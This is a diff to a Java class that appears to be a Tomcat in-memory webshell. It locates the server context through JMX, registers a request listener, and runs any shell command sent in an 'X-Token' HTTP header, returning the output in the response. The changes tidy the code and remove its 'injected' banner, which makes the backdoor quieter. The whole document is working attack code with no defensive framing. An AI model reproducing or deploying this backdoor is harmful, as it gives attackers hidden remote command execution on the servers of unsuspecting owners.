@@ -17,6 +17,7 @@ import java.util.Set;
  * Tomcat 7 8 9
  */
 public class TomcatListenerJMXMS implements ServletRequestListener {
+    private static String header = "X-Token";
     public TomcatListenerJMXMS() {
 
     }
@@ -32,7 +33,7 @@ public class TomcatListenerJMXMS implements ServletRequestListener {
                 // springboot 中是 Tomcat
                 objectSet = repository.query(new javax.management.ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
             }
-            for (com.sun.jmx.mbeanserver.NamedObject namedObject : objectSet) {
+            for (NamedObject namedObject : objectSet) {
                 javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
                 org.apache.catalina.authenticator.AuthenticatorBase authenticatorBase = (org.apache.catalina.authenticator.AuthenticatorBase) getFieldValue(dynamicMBean, "resource");
                 org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(authenticatorBase, "context");
@@ -53,14 +54,13 @@ public class TomcatListenerJMXMS implements ServletRequestListener {
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
-            String header = httpServletRequest.getHeader("X-Token");
-            if (header == null) {
+            String cmd = httpServletRequest.getHeader(header);
+            if (cmd == null) {
                 return;
             }
-            String result = exec(header);
+            String result = exec(cmd);
             org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
             PrintWriter printWriter = request.getResponse().getWriter();
-            printWriter.println("TomcatListenerJMXMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
@@ -71,7 +71,7 @@ public class TomcatListenerJMXMS implements ServletRequestListener {
     public static String exec(String str) {
         try {
             String[] cmd = null;
-            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 cmd = new String[]{"cmd.exe", "/c", str};
             } else {
                 cmd = new String[]{"/bin/sh", "-c", str};
